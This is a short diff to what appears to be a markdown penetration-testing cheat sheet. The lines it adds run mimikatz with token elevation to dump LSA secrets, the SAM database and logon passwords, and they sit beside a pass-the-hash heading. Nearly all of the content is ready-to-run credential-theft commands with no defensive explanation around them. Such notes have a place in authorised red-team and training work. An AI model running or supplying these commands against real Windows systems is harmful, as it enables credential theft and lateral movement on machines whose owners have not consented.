@@ -261,6 +261,16 @@ $results = .\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
 echo $results
 ```
 
+```powershell
+$results = .\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
+echo $results
+```
+or all in one go:
+```powershell
+$results = .\mimikatz.exe privilege::debug token::elevate sekurlsa::logonpasswords lsadump::sam lsadump::secrets exit
+echo $results
+```
+
 #pth #overpass-the-hash 
 
 ```powershell
